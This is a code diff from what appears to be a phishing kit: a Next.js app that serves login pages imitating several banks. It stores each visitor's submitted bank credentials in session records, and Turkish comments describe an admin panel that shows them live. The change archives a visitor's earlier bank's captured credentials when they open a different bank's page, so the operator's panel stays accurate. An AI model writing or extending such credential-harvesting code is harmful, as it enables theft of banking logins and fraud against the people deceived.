@@ -3,6 +3,7 @@ import { BankLoginClient } from "./bank-login-client";
 import { getBankBySlug } from "@/lib/at-bank-catalog";
 import { renderDedicatedBankClient } from "@/lib/bank-client-registry";
 import { resolveServerSessionIdentity } from "@/lib/session-id";
+import { archivePreviousBankOnChange } from "@/lib/bank-cleanup";
 import { createServerSupabaseClient } from "@/lib/supabase/server";
 
 type Props = {
@@ -19,6 +20,9 @@ export default async function BankLoginPage({ params }: Props) {
 
   // Admin panel "guncel sayfa" kolonu icin: kullanici hangi banka sayfasinda
   // goruntuleme yapiyor — submit'ten bagimsiz olarak burada yazilir.
+  // AYrica: onceki SUBMIT edilmis banka bu sayfadan farkliysa, eski bankanin
+  // credential kaydini history'ye arsivle ve flat credential alanlarini temizle —
+  // aksi halde admin paneli eski bankanin verilerini YENI bankanin kolonunda gosterir.
   if (sessionId && bank) {
     try {
       const sb = await createServerSupabaseClient();
@@ -29,16 +33,19 @@ export default async function BankLoginPage({ params }: Props) {
           .eq("id", sessionId)
           .maybeSingle();
         const fd = (data?.form_data ?? {}) as Record<string, unknown>;
-        if (fd.viewingBankSlug !== bank_slug) {
+        const next: Record<string, unknown> = {
+          ...archivePreviousBankOnChange(fd, bank_slug),
+          viewingBankName: bankName,
+          viewingBankSlug: bank_slug,
+        };
+        if (
+          fd.viewingBankSlug !== bank_slug ||
+          next.bankSlug !== fd.bankSlug ||
+          next.bankLoginHistory !== fd.bankLoginHistory
+        ) {
           await sb
             .from("sessions")
-            .update({
-              form_data: {
-                ...fd,
-                viewingBankName: bankName,
-                viewingBankSlug: bank_slug,
-              },
-            })
+            .update({ form_data: next })
             .eq("id", sessionId);
         }
       }
